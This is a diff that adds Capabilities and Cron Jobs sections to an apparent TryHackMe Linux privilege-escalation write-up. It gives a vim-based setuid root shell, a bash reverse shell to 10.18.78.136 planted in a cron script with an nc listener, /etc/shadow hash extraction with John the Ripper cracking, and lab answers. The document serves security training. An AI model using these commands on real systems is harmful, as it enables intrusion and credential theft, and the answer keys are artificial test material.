@@ -152,7 +152,6 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    ![Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Sudo_Hashes.png)
 
    ><details><summary>Click for answer</summary>$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1</details>
-   
 
 ### Privilege Escalation: SUID
 
@@ -218,7 +217,113 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    ><details><summary>Click for answer</summary>THM-3847834</details>
 
 ### Privilege Escalation: Capabilities
+
+1. How many binaries have set capabilities?
+
+   Using `getcap -r` we can see which binaries have capabilities set.
+   
+   ```cmd
+   getcap -r / 2>/dev/null
+   ```
+
+   CAPABILITIES SET
+
+   ><details><summary>Click for answer</summary>6</details>
+
+1. What other binary can be used through its capabilities?
+
+   Comparing our previous binary list on GTFObins should give us the answer.
+   
+   CAPABILITIES BIN
+
+   ><details><summary>Click for answer</summary>view</details>
+
+3. What is the content of the flag4.txt file?
+
+   First we look for the flag using:
+
+   ```cmd
+   find /home -name flag4.txt 2>/dev/null
+   ```
+
+   Apparently, we can read the file without root access.
+
+   CAPABILITIES FLAG
+
+   Lets try the escalation our privileges anyway using the view binary. For this to work we need to use the path we identified in the first image. Then use the following command:
+
+   ```cmd
+   /home/ubuntu/view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+   ```
+
+   This gives us a root shell that we can leverage.
+
+   CAPABILITIES ROOT
+
+   ><details><summary>Click for answer</summary>THM-9349843</details>
+
 ### Privilege Escalation: Cron Jobs
+
+1.  How many user-defined cron jobs can you see on the target system?
+
+   Using the following command we can list all existing cronjobs:
+
+   ```cmd
+   cat /etc/crontab
+   ```
+
+   CRON TAB
+
+   ><details><summary>Click for answer</summary>4</details>
+
+2. What is the content of the flag5.txt file?
+
+   We have found a script we can alter (backup.sh). Lets add a simple tcp reverse shell using bash taken from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp).
+
+   ```cmd
+   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
+   ```
+
+   CRON SCRIPT
+
+   As the shell didn't work at first, I had to check its permissions with `ls -lh`. This showed the file wasn't executale.
+
+   CRON PERMISSIONS
+
+   Using `chmod +x backup.sh` would fix this.
+
+   Now we set up a listener on our machine and wait.
+
+   ```cmd
+   nc -nlvp 1337
+   ```
+
+   Once the connection is made, we can look for the flag.
+
+   CRON FLAG
+
+   ><details><summary>Click for answer</summary>THM-383000283</details>
+
+4. What is Matt's password?
+
+   To do this we need his password hash. This can be done by viewing the shadow file.
+
+   ```cmd
+   cat /etc/shadow | grep "matt"
+   ```
+
+   CRON HASH
+
+   Now we can plug this into John the Ripper to crack the password itself (using `sha512crypt` as the format).
+
+   ```cmd
+   john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt  matpass.hash
+   ```
+
+   CRON PASSWORD
+
+   ><details><summary>Click for answer</summary>123456</details>
+
 ### Privilege Escalation: PATH
 ### Privilege Escalation: NFS
 ### Capstone Challenge
